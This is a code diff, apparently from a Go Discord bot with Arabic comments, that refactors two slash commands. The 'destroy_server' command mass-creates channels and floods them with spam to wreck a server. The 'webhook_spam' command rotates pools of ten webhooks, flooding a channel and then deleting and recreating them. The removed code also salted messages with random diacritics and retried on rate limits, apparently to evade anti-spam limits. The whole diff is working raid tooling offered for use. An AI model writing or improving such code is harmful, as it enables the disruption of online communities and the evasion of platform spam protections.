@@ -42,37 +42,29 @@ func main() {
 		return
 	}
 
-	sess.Identify.Intents = discordgo.IntentsGuilds | discordgo.IntentsGuildMembers | discordgo.IntentsAll
+	sess.Identify.Intents = discordgo.IntentsGuilds | discordgo.IntentsGuildMembers | discordgo.IntentsGuildWebhooks | discordgo.IntentsAll
 
-	cmdName := "destroy_server"
-	command := &discordgo.ApplicationCommand{
-		Name:        cmdName,
+	// تعريف أمر تدمير السيرفر
+	destroyCmd := &discordgo.ApplicationCommand{
+		Name:        "destroy_server",
 		Description: "أمر تدمير السيرفر (باند مضمون وسرعة صاروخية)",
 		Options: []*discordgo.ApplicationCommandOption{
-			{
-				Type:        discordgo.ApplicationCommandOptionString,
-				Name:        "room_name",
-				Description: "اسم الرومات الجديدة",
-				Required:    true,
-			},
-			{
-				Type:        discordgo.ApplicationCommandOptionInteger,
-				Name:        "rooms_count",
-				Description: "عدد الرومات المراد إنشاؤها",
-				Required:    true,
-			},
-			{
-				Type:        discordgo.ApplicationCommandOptionString,
-				Name:        "message_content",
-				Description: "محتوى رسالة السبام",
-				Required:    true,
-			},
-			{
-				Type:        discordgo.ApplicationCommandOptionInteger,
-				Name:        "messages_count",
-				Description: "عدد الرسائل في كل روم",
-				Required:    true,
-			},
+			{Type: discordgo.ApplicationCommandOptionString, Name: "room_name", Description: "اسم الرومات الجديدة", Required: true},
+			{Type: discordgo.ApplicationCommandOptionInteger, Name: "rooms_count", Description: "عدد الرومات المراد إنشاؤها", Required: true},
+			{Type: discordgo.ApplicationCommandOptionString, Name: "message_content", Description: "محتوى رسالة السبام", Required: true},
+			{Type: discordgo.ApplicationCommandOptionInteger, Name: "messages_count", Description: "عدد الرسائل في كل روم", Required: true},
+		},
+	}
+
+	// تعريف أمر الويب هوكات
+	webhookCmd := &discordgo.ApplicationCommand{
+		Name:        "webhook_spam",
+		Description: "إنشاء 10 ويب هوكات، سبام، استراحة 3 ثواني، وحذفهم وتجديدهم",
+		Options: []*discordgo.ApplicationCommandOption{
+			{Type: discordgo.ApplicationCommandOptionChannel, Name: "channel", Description: "الروم المحدد للإرسال", Required: true},
+			{Type: discordgo.ApplicationCommandOptionString, Name: "webhook_name", Description: "اسم الويب هوك", Required: true},
+			{Type: discordgo.ApplicationCommandOptionString, Name: "message_content", Description: "محتوى الرسالة", Required: true},
+			{Type: discordgo.ApplicationCommandOptionInteger, Name: "messages_count", Description: "عدد الرسائل الإجمالي", Required: true},
 		},
 	}
 
@@ -83,18 +75,18 @@ func main() {
 
 		data := i.ApplicationCommandData()
 
-		if data.Name == cmdName {
-			if (i.Member.Permissions & discordgo.PermissionAdministrator) == 0 {
-				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-					Type: discordgo.InteractionResponseChannelMessageWithSource,
-					Data: &discordgo.InteractionResponseData{
-						Content: "❌ يجب أن تكون مشرفاً لاستخدام هذا الأمر.",
-						Flags:   discordgo.MessageFlagsEphemeral,
-					},
-				})
-				return
-			}
+		if (i.Member.Permissions & discordgo.PermissionAdministrator) == 0 {
+			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
+				Type: discordgo.InteractionResponseChannelMessageWithSource,
+				Data: &discordgo.InteractionResponseData{
+					Content: "❌ يجب أن تكون مشرفاً لاستخدام هذا الأمر.",
+					Flags:   discordgo.MessageFlagsEphemeral,
+				},
+			})
+			return
+		}
 
+		if data.Name == "destroy_server" {
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
@@ -103,16 +95,15 @@ func main() {
 				},
 			})
 
-			options := data.Options
-			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
-			for _, opt := range options {
-				optionMap[opt.Name] = opt
+			optMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
+			for _, opt := range data.Options {
+				optMap[opt.Name] = opt
 			}
 
-			roomName := optionMap["room_name"].StringValue()
-			roomsCount := int(optionMap["rooms_count"].IntValue())
-			messageContent := optionMap["message_content"].StringValue()
-			messagesCount := int(optionMap["messages_count"].IntValue())
+			roomName := optMap["room_name"].StringValue()
+			roomsCount := int(optMap["rooms_count"].IntValue())
+			messageContent := optMap["message_content"].StringValue()
+			messagesCount := int(optMap["messages_count"].IntValue())
 			guildID := i.GuildID
 
 			go executeDestruction(s, token, guildID, roomName, roomsCount, messageContent, messagesCount)
@@ -120,36 +111,25 @@ func main() {
 		}
 
 		if data.Name == "webhook_spam" {
-			if (i.Member.Permissions & discordgo.PermissionAdministrator) == 0 {
-				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-					Type: discordgo.InteractionResponseChannelMessageWithSource,
-					Data: &discordgo.InteractionResponseData{
-						Content: "❌ يجب أن تكون مشرفاً لاستخدام هذا الأمر.",
-						Flags:   discordgo.MessageFlagsEphemeral,
-					},
-				})
-				return
-			}
-
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
-					Content: "⚡ جاري تشغيل مجمع الويب هوكات الذكي...",
+					Content: "⚡ جاري تشغيل مجمع الويب هوكات الذكي (10 ويب هوكات + حذف وتجديد)...",
 					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
 
-			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
+			optMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
 			for _, opt := range data.Options {
-				optionMap[opt.Name] = opt
+				optMap[opt.Name] = opt
 			}
 
-			targetChannel := optionMap["channel"].ChannelValue(s)
-			webhookName := optionMap["webhook_name"].StringValue()
-			messageContent := optionMap["message_content"].StringValue()
-			messagesCount := int(optionMap["messages_count"].IntValue())
+			targetChannel := optMap["channel"].ChannelValue(s)
+			webhookName := optMap["webhook_name"].StringValue()
+			messageContent := optMap["message_content"].StringValue()
+			messagesCount := int(optMap["messages_count"].IntValue())
 
-			go executeBucketLimitWebhookRotation(token, targetChannel.ID, webhookName, messageContent, messagesCount)
+			go runWebhookLoop(token, targetChannel.ID, webhookName, messageContent, messagesCount)
 			return
 		}
 	})
@@ -160,18 +140,11 @@ func main() {
 		return
 	}
 
-	_, err = sess.ApplicationCommandCreate(sess.State.User.ID, "", command)
-	if err != nil {
-		fmt.Println("خطأ في تسجيل أمر تدمير السيرفر:", err)
-	}
+	// تسجيل الأوامر في ديسكورد
+	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", destroyCmd)
+	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", webhookCmd)
 
-	// ⚠️ التعديل الجذري: تسجيل أمر الويب هوك هنا لكي يظهر في الديسكورد ولا يتم نسيانه
-	_, err = sess.ApplicationCommandCreate(sess.State.User.ID, "", webhookCmd)
-	if err != nil {
-		fmt.Println("خطأ في تسجيل أمر الويب هوك:", err)
-	}
-
-	fmt.Println("🤖 البوت شغال الآن وجاهز لكل الأوامر!")
+	fmt.Println("🤖 البوت شغال الآن وجاهز بكل الأوامر بنجاح!")
 
 	stop := make(chan os.Signal, 1)
 	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
@@ -180,6 +153,7 @@ func main() {
 	sess.Close()
 }
 
+// دالة تدمير السيرفر الأصلية
 func executeDestruction(s *discordgo.Session, token, guildID, roomName string, roomsCount int, messageContent string, messagesCount int) {
 	headers := map[string]string{
 		"Authorization": "Bot " + token,
@@ -343,85 +317,51 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 	}
 }
 
-var webhookCmd = &discordgo.ApplicationCommand{
-	Name:        "webhook_spam",
-	Description: "سبام عبر مجمع ويب هوكات الذكي والحذف التلقائي",
-	Options: []*discordgo.ApplicationCommandOption{
-		{
-			Type:        discordgo.ApplicationCommandOptionChannel,
-			Name:        "channel",
-			Description: "الروم المحدد للإرسال",
-			Required:    true,
-		},
-		{
-			Type:        discordgo.ApplicationCommandOptionString,
-			Name:        "webhook_name",
-			Description: "اسم الويب هوك",
-			Required:    true,
-		},
-		{
-			Type:        discordgo.ApplicationCommandOptionString,
-			Name:        "message_content",
-			Description: "محتوى الرسالة",
-			Required:    true,
-		},
-		{
-			Type:        discordgo.ApplicationCommandOptionInteger,
-			Name:        "messages_count",
-			Description: "عدد الرسائل الإجمالي",
-			Required:    true,
-		},
-	},
-}
-
-func executeBucketLimitWebhookRotation(token, channelID, webhookName, messageContent string, messagesCount int) {
+// دالة الويب هوكات (إنشاء 10 👈 سبام 👈 استراحة 3 ثواني 👈 حذف مؤكد وتجديد)
+func runWebhookLoop(token, channelID, whName, msgContent string, totalMsgs int) {
 	headers := map[string]string{
 		"Authorization": "Bot " + token,
 		"Content-Type":  "application/json",
 	}
 
-	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
-	arabicDiacritics := []string{"ِ", "ُ", "َّ", "ٍ", "ٓ", "ٌ", "ْ", "ٰ"}
-
-	sentMessages := 0
+	sent := 0
 	poolSize := 10
-	messagesPerPoolRound := 50
+	round := 1
 
-	type WebhookInfo struct {
+	type WH struct {
 		ID  string
 		URL string
 	}
 
-	round := 1
-	for sentMessages < messagesCount {
-		var pool []WebhookInfo
+	for sent < totalMsgs {
+		var pool []WH
 		var mu sync.Mutex
-		var wgCreation sync.WaitGroup
+		var wg sync.WaitGroup
 
+		// 1. إنشاء 10 ويب هوكات
 		for i := 0; i < poolSize; i++ {
-			wgCreation.Add(1)
-			go func(index int) {
-				defer wgCreation.Done()
-				nameSuffix := fmt.Sprintf("-%d-%d", index+1, time.Now().UnixNano()%10000)
-				whPayload, _ := json.Marshal(map[string]string{"name": webhookName + nameSuffix})
-				whReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+channelID+"/webhooks", bytes.NewBuffer(whPayload))
+			wg.Add(1)
+			go func(idx int) {
+				defer wg.Done()
+				body, _ := json.Marshal(map[string]string{"name": fmt.Sprintf("%s-%d-%d", whName, idx+1, time.Now().UnixNano()%10000)})
+				req, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+channelID+"/webhooks", bytes.NewBuffer(body))
 				for k, v := range headers {
-					whReq.Header.Set(k, v)
+					req.Header.Set(k, v)
 				}
 
-				whResp, err := client.Do(whReq)
+				resp, err := client.Do(req)
 				if err != nil {
 					return
 				}
-				defer whResp.Body.Close()
+				defer resp.Body.Close()
 
-				if whResp.StatusCode == http.StatusOK || whResp.StatusCode == http.StatusCreated {
-					var whResult map[string]interface{}
-					if err := json.NewDecoder(whResp.Body).Decode(&whResult); err == nil {
-						if id, okID := whResult["id"].(string); okID {
-							if tk, okTk := whResult["token"].(string); okTk {
+				if resp.StatusCode == 200 || resp.StatusCode == 201 {
+					var res map[string]interface{}
+					if json.NewDecoder(resp.Body).Decode(&res) == nil {
+						if id, ok1 := res["id"].(string); ok1 {
+							if tk, ok2 := res["token"].(string); ok2 {
 								mu.Lock()
-								pool = append(pool, WebhookInfo{
+								pool = append(pool, WH{
 									ID:  id,
 									URL: fmt.Sprintf("https://discord.com/api/v10/webhooks/%s/%s", id, tk),
 								})
@@ -432,69 +372,53 @@ func executeBucketLimitWebhookRotation(token, channelID, webhookName, messageCon
 				}
 			}(i)
 		}
-		wgCreation.Wait()
+		wg.Wait()
 
 		if len(pool) == 0 {
 			time.Sleep(1 * time.Second)
 			continue
 		}
 
-		currentBatchSize := messagesPerPoolRound
-		if messagesCount-sentMessages < currentBatchSize {
-			currentBatchSize = messagesCount - sentMessages
+		// 2. إرسال الرسائل عبر الـ 10 ويب هوكات الحالية
+		batchToSend := 50
+		if totalMsgs-sent < batchToSend {
+			batchToSend = totalMsgs - sent
 		}
 
 		var spamWg sync.WaitGroup
-		for j := 0; j < currentBatchSize; j++ {
+		for j := 0; j < batchToSend; j++ {
 			spamWg.Add(1)
-			go func(msgIdx int, wh WebhookInfo) {
+			go func(mIdx int, targetWH WH) {
 				defer spamWg.Done()
+				b, _ := json.Marshal(map[string]string{"content": fmt.Sprintf("%s (%d)", msgContent, mIdx+1)})
+				req, _ := http.NewRequest("POST", targetWH.URL, bytes.NewBuffer(b))
+				req.Header.Set("Content-Type", "application/json")
 
-				diacriticsSalt := ""
-				for k := 0; k <= (msgIdx % 3); k++ {
-					diacriticsSalt += arabicDiacritics[rng.Intn(len(arabicDiacritics))]
+				if resp, err := client.Do(req); err == nil {
+					resp.Body.Close()
 				}
-				finalMsg := messageContent + diacriticsSalt
-				msgPayload, _ := json.Marshal(map[string]string{"content": finalMsg})
-
-				for {
-					msgReq, _ := http.NewRequest("POST", wh.URL, bytes.NewBuffer(msgPayload))
-					msgReq.Header.Set("Content-Type", "application/json")
-
-					msgResp, err := client.Do(msgReq)
-					if err == nil {
-						if msgResp.StatusCode == http.StatusOK || msgResp.StatusCode == http.StatusNoContent {
-							msgResp.Body.Close()
-							break
-						} else if msgResp.StatusCode == 429 {
-							msgResp.Body.Close()
-							time.Sleep(200 * time.Millisecond)
-							continue
-						}
-						msgResp.Body.Close()
-					}
-					break
-				}
-			}(sentMessages+j, pool[j%len(pool)])
+			}(sent+j, pool[j%len(pool)])
 		}
 		spamWg.Wait()
-		sentMessages += currentBatchSize
+		sent += batchToSend
 
+		// 3. استراحة 3 ثواني
 		time.Sleep(3 * time.Second)
 
+		// 4. حذف الـ 10 ويب هوكات القدامى فعلياً والانتظار حتى اكتمال الحذف
 		var delWg sync.WaitGroup
-		for _, wh := range pool {
+		for _, w := range pool {
 			delWg.Add(1)
-			go func(wID string) {
+			go func(webhookID string) {
 				defer delWg.Done()
-				delReq, _ := http.NewRequest("DELETE", "https://discord.com/api/v10/webhooks/"+wID, nil)
+				req, _ := http.NewRequest("DELETE", "https://discord.com/api/v10/webhooks/"+webhookID, nil)
 				for k, v := range headers {
-					delReq.Header.Set(k, v)
+					req.Header.Set(k, v)
 				}
-				if r, e := client.Do(delReq); e == nil {
-					r.Body.Close()
+				if resp, err := client.Do(req); err == nil {
+					resp.Body.Close()
 				}
-			}(wh.ID)
+			}(w.ID)
 		}
 		delWg.Wait()
 
